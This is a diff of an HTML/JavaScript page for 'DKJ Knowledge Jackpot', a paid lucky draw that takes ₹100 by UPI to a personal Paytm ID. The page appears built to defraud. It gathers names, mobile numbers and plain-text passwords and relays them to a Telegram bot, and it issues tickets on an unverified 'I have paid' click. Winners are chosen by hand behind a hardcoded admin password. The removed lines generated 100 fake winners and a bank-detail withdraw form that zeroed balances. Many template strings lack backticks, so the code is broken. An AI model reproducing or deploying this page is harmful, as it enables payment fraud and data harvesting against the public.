@@ -13,23 +13,21 @@
         .bal-text { font-size: 35px; color: #27ae60; font-weight: bold; margin: 10px 0; }
         .pg-container { background: #ddd; height: 12px; border-radius: 10px; margin: 10px 0; overflow: hidden; }
         .pg-bar { background: var(--gold); height: 100%; width: 52%; transition: 0.5s; }
-        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; display: inline-block; box-sizing: border-box; text-decoration: none; text-align: center; font-size: 14px; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; display: block; box-sizing: border-box; text-decoration: none; text-align: center; font-size: 14px; }
         .btn-dark { background: var(--dark); color: white; }
         .btn-gold { background: var(--gold); color: black; }
         .btn-tg { background: var(--tg-blue); color: white; }
-        .scroll-box { display: flex; overflow-x: auto; padding: 10px; gap: 15px; scrollbar-width: none; }
-        .draw-box { min-width: 160px; background: white; padding: 15px; border-radius: 12px; border: 2px solid var(--dark); text-align: center; color: #000; }
+        .scroll-box { display: flex; overflow-x: auto; padding: 10px; gap: 15px; }
+        .draw-box { min-width: 160px; background: white; padding: 15px; border-radius: 12px; border: 2px solid var(--dark); text-align: center; }
         #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; color: white; padding: 20px; box-sizing: border-box; text-align: center; overflow-y: auto; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; font-weight: bold; color: #000; outline: none; }
-        .list-item { background: #222; padding: 10px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); cursor: pointer; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; outline: none; box-sizing: border-box; }
+        .list-item { background: #222; padding: 10px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); }
         .tc-text { text-align: left; font-size: 13px; line-height: 1.6; color: #ccc; }
     </style>
 </head>
 <body>
 
-<div class="marquee-box">
-    <marquee>🔥 Lucky Winner Draw Date: 13 March 2026 || Join Mega Draw Now & Win Big!! 🔥</marquee>
-</div>
+<div class="marquee-box"><marquee>🔥 Lucky Winner Draw Date: 13 March 2026 || Join Mega Draw Now & Win Big!! 🔥</marquee></div>
 
 <div class="header" onclick="adminMode()">
     <h1 style="margin:0; font-size:18px;">DKJ KNOWLEDGE JACKPOT</h1>
@@ -50,15 +48,13 @@
 
 <div class="scroll-box">
     <div class="draw-box" style="border-color: var(--gold);">
-        <h3 style="margin:0; font-size:14px;">MEGA DRAW</h3><h2 style="margin:10px 0;">₹100</h2>
-        <button class="btn btn-dark" style="padding:8px;" onclick="join(100)">JOIN NOW</button>
+        <h3>MEGA DRAW</h3><h2>₹100</h2>
+        <button class="btn btn-dark" onclick="join(100)">JOIN NOW</button>
     </div>
-    <div class="draw-box" style="opacity:0.5;"><h3>SILVER</h3><h2>₹200</h2><button class="btn" disabled>LOCKED</button></div>
-    <div class="draw-box" style="opacity:0.5;"><h3>GOLD</h3><h2>₹500</h2><button class="btn" disabled>LOCKED</button></div>
 </div>
 
 <div style="padding: 10px;">
-    <button id="rBtn" class="btn btn-gold" onclick="showReg()">➕ CREATE ACCOUNT (DIRECT)</button>
+    <button id="rBtn" class="btn btn-gold" onclick="showReg()">➕ CREATE ACCOUNT</button>
     <button class="btn btn-dark" onclick="showProfile()">👤 MY PROFILE & CODES</button>
     <button class="btn btn-gold" onclick="showWinners()">🏆 TOP WINNERS</button>
     <button class="btn" style="background:#555; color:white;" onclick="showTC()">📄 TERMS & CONDITIONS</button>
@@ -75,148 +71,94 @@
     const TG_ADMIN_ID = "8072402346"; 
     const UPI_ID = "paytmqr6vnhle@ptys";
 
-    let db = JSON.parse(localStorage.getItem('dkj_vfinal_db')) || { users: [], entries: [], winners: [] };
-    let currentUser = JSON.parse(localStorage.getItem('dkj_vfinal_user')) || null;
-
-    const questions = [
-        {q: "India ka National Game kaun sa hai?", a: "hockey"},
-        {q: "Taj Mahal kaun se sheher mein hai?", a: "agra"},
-        {q: "1 Litre mein kitne ML hote hain?", a: "1000"},
-        {q: "Holi kaun sa tyohar hai?", a: "rangon"},
-        {q: "Human body mein kitni haddiyan hoti hain?", a: "206"}
-    ];
-
-    if(db.winners.length < 100){
-        let demoNames = ["Manoj","Sunil","Abhi","Karan","Rishi","Pooja","Neha","Salman","Arjun","Deepak"];
-        for(let i=1; i<=100; i++){
-            let pz = [10000, 5000, 2000, 1000, 500][Math.floor(Math.random()*5)];
-            db.winners.push({name: demoNames[Math.floor(Math.random()*demoNames.length)]+" "+i, id: 1000+i, prize: pz, code: "DKJ-"+(100000+i)});
-        }
-    }
+    let db = JSON.parse(localStorage.getItem('dkj_db')) || { users: [], entries: [], winners: [] };
+    let currentUser = JSON.parse(localStorage.getItem('dkj_user')) || null;
 
     function save() {
-        localStorage.setItem('dkj_vfinal_db', JSON.stringify(db));
-        localStorage.setItem('dkj_vfinal_user', JSON.stringify(currentUser));
+        localStorage.setItem('dkj_db', JSON.stringify(db));
+        localStorage.setItem('dkj_user', JSON.stringify(currentUser));
     }
 
     function tgMsg(msg) {
-        fetch(https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown);
+        fetch(https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown).catch(e => console.log(e));
     }
 
     function showReg() {
-        document.getElementById('pContent').innerHTML = `
-            <h2 style="color:var(--gold);">CREATE ACCOUNT</h2>
-            <input type="text" id="rn" placeholder="Enter Full Name">
-            <input type="number" id="rm" placeholder="Enter Mobile Number">
-            <input type="password" id="rp" placeholder="Create Password">
-            <button class="btn btn-gold" onclick="doReg()">REGISTER NOW</button>
-            <p style="font-size:12px; color:#aaa;">No OTP Required! Instant Joining.</p>
-        `;
+        document.getElementById('pContent').innerHTML = <h2>REGISTER</h2><input id="rn" placeholder="Full Name"><input id="rm" type="number" placeholder="Mobile"><input id="rp" type="password" placeholder="Password"><button class="btn btn-gold" onclick="doReg()">CREATE ACCOUNT</button>;
         document.getElementById('popup').style.display = 'block';
     }
 
     function doReg() {
-        const n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
-        if(!n || !m || !p) return alert("Please fill all details!");
-        
-        currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*8999), codes: [] };
-        db.users.push(currentUser); 
-        save(); 
-        updateUI(); 
-        tgMsg(✅ *NEW REGISTRATION*\n👤 Name: ${n}\n📱 Mobile: ${m}\n🆔 User ID: ${currentUser.id});
-        alert("Account Created Successfully!");
-        closeP();
+        let n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
+        if(!n || !m || !p) return alert("Fill all!");
+        currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*9000), codes: [] };
+        db.users.push(currentUser); save(); updateUI();
+        tgMsg(✅ *New User:* ${n}\n📱 *Mob:* ${m});
+        alert("Success!"); closeP();
     }
 
     function join(amt) {
-        if(!currentUser) return alert("Pehle Account Banayein!");
-        let hasActive = db.entries.find(e => e.uId == currentUser.id);
-        if(hasActive) return alert("Aapke paas pehle se ek active ticket hai!");
-
-        document.getElementById('pContent').innerHTML = <h2>PAYMENT</h2><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}&am=${amt}"><button class="btn btn-gold" onclick="showQuiz()">I HAVE PAID</button>;
+        if(!currentUser) return alert("Login First!");
+        if(db.entries.find(e => e.uId == currentUser.id)) return alert("Already have a ticket!");
+        document.getElementById('pContent').innerHTML = <h2>PAYMENT</h2><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="generateTicket()">I HAVE PAID</button>;
         document.getElementById('popup').style.display = 'block';
-    }
-
-    function showQuiz() {
-        let qz = questions[Math.floor(Math.random()*questions.length)];
-        document.getElementById('pContent').innerHTML = <h2>KNOWLEDGE TEST</h2><p>${qz.q}</p><input id="gkAns" placeholder="Your Answer"><button class="btn btn-gold" onclick="generateTicket()">SUBMIT</button>;
     }
 
     function generateTicket() {
-        let ticket = "DKJ-" + Math.floor(100000 + Math.random()*899999);
+        let ticket = "DKJ-" + Math.floor(100000 + Math.random()*900000);
         currentUser.codes.push(ticket);
         db.entries.push({ uId: currentUser.id, name: currentUser.name, code: ticket });
-        save();
-        tgMsg(🎟 *NEW TICKET*\n👤 User: ${currentUser.name}\n🎫 Ticket: ${ticket});
-        alert("Success! Ticket Code: " + ticket);
-        closeP(); updateUI();
+        save(); tgMsg(🎟 *New Ticket:* ${currentUser.name}\n🎫 *Code:* ${ticket});
+        alert("Ticket Issued: " + ticket); closeP(); updateUI();
     }
 
     function showTC() {
-        document.getElementById('pContent').innerHTML = <h2 style="color:var(--gold);">Terms & Conditions</h2><div class="tc-text"><p>1. Ek user ek waqt mein sirf 1 hi active ticket le sakta hai.</p><p>2. Draw ki nishchit date <b>13 March 2026</b> hai, lekin management ise kabhi bhi aage badha sakta hai.</p><p>3. Winner ka chayan puri tarah se random system dwara kiya jata hai.</p><p>4. Withdrawal request 24 ghante mein process ki jati hai.</p></div>;
+        document.getElementById('pContent').innerHTML = <h2>T&C</h2><div class="tc-text"><p>1. Draw date 13 March 2026 hai, ise aage badhaya ja sakta hai.</p><p>2. Ek person ek hi code le sakta hai jab tak draw na ho jaye.</p></div>;
         document.getElementById('popup').style.display = 'block';
     }
 
-    function withdraw() {
-        if(!currentUser || currentUser.bal <= 0) return alert("No Balance!");
-        document.getElementById('pContent').innerHTML = <h2>WITHDRAW</h2><input id="wON" placeholder="Holder Name"><input id="wBN" placeholder="Bank/UPI"><input id="wAN" placeholder="AC No."><input id="wIF" placeholder="IFSC Code"><button class="btn btn-gold" onclick="confirmW()">SUBMIT</button>;
+    function showWinners() {
+        let h = "<h2>WINNERS</h2>";
+        db.winners.slice(-20).forEach(w => { h += <div class="list-item">${w.name} - ₹${w.prize}</div>; });
+        document.getElementById('pContent').innerHTML = h || "No winners yet";
         document.getElementById('popup').style.display = 'block';
     }
 
-    function confirmW() {
-        tgMsg(💰 *WITHDRAW*\nUser: ${currentUser.name}\nAmt: ₹${currentUser.bal}\nHolder: ${document.getElementById('wON').value}\nBank: ${document.getElementById('wBN').value});
-        currentUser.bal = 0; save(); updateUI(); closeP();
-        alert("Request Sent! Balance zero ho gaya.");
+    function showProfile() {
+        if(!currentUser) return alert("Login First!");
+        document.getElementById('pContent').innerHTML = <h2>PROFILE</h2><p>Name: ${currentUser.name}</p><p>ID: ${currentUser.id}</p><p>Codes: ${currentUser.codes.join(", ")}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>;
+        document.getElementById('popup').style.display = 'block';
     }
 
     function adminMode() {
-        if(prompt("Admin PW:") !== "7860") return;
-        let act = prompt("1: Add Winners (20 List)\n2: Reset All");
-        if(act === "1") {
-            let list = [...db.entries].sort(() => 0.5 - Math.random()).slice(0, 20);
-            let h = "<h2>Add Winners</h2>";
-            list.forEach((u, i) => { h += <div class="list-item" onclick="finalWin('${u.uId}', '${u.code}')">${u.name} (Code: ${u.code})</div>; });
+        let pw = prompt("Admin PW:");
+        if(pw !== "7860") return;
+        let act = prompt("1: Add Winner\n2: Reset");
+        if(act=="1") {
+            let h = "<h2>Select Winner</h2>";
+            db.entries.forEach(e => { h += <div class="list-item" onclick="makeWin('${e.uId}','${e.code}')">${e.name} (${e.code})</div>; });
             document.getElementById('pContent').innerHTML = h; document.getElementById('popup').style.display = 'block';
-        } else if(act === "2") { localStorage.clear(); location.reload(); }
+        } else if(act=="2") { localStorage.clear(); location.reload(); }
     }
 
-    function finalWin(uid, code) {
-        let winAmt = prompt("Prize Amount (₹):");
-        if(!winAmt) return;
-        let idx = db.entries.findIndex(x => x.uId == uid && x.code == code);
-        let user = db.entries[idx];
-        db.winners.push({ name: user.name, id: uid, code: code, prize: parseInt(winAmt) });
-        let uObj = db.users.find(x => x.id == uid);
-        if(uObj) uObj.bal += parseInt(winAmt);
-        if(currentUser && currentUser.id == uid) currentUser.bal = uObj.bal;
-        db.entries.splice(idx, 1);
-        save(); updateUI(); alert("Prize Added!"); closeP();
+    function makeWin(uid, code) {
+        let amt = prompt("Prize Amount?");
+        if(!amt) return;
+        db.winners.push({name: uid, prize: amt});
+        let u = db.users.find(x => x.id == uid);
+        if(u) u.bal += parseInt(amt);
+        db.entries = db.entries.filter(x => x.code !== code);
+        save(); alert("Done!"); closeP(); updateUI();
     }
 
     function updateUI() {
         if(currentUser) {
-            document.getElementById('uHi').innerText = "Hi, " + currentUser.name + " (ID: " + currentUser.id + ")";
+            document.getElementById('uHi').innerText = "Hi, " + currentUser.name;
             document.getElementById('vBal').innerText = "₹" + (currentUser.bal || 0);
             document.getElementById('rBtn').style.display = 'none';
         }
     }
-
-    function showWinners() {
-        let h = "<h2>🏆 RECENT WINNERS</h2>";
-        let mixed = [...db.winners].sort(() => 0.5 - Math.random()).slice(0, 100);
-        mixed.forEach(w => {
-            h += <div class="list-item"><span style="color:var(--gold);">ID: ${w.id}</span> <span style="float:right; color:#27ae60;">₹${w.prize}</span><br><small>${w.name} | ${w.code}</small></div>;
-        });
-        document.getElementById('pContent').innerHTML = h; document.getElementById('popup').style.display = 'block';
-    }
-
-    function showProfile() {
-        if(!currentUser) return;
-        document.getElementById('pContent').innerHTML = <h2>MY PROFILE</h2><p>ID: ${currentUser.id}</p><p>Mobile: ${currentUser.mob}</p><p>Codes: ${currentUser.codes.join(", ") || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>;
-        document.getElementById('popup').style.display = 'block';
-    }
-
-    function logout() { localStorage.removeItem('dkj_vfinal_user'); location.reload(); }
+    function logout() { localStorage.removeItem('dkj_user'); location.reload(); }
     function closeP() { document.getElementById('popup').style.display = 'none'; }
     window.onload = updateUI;
 </script>
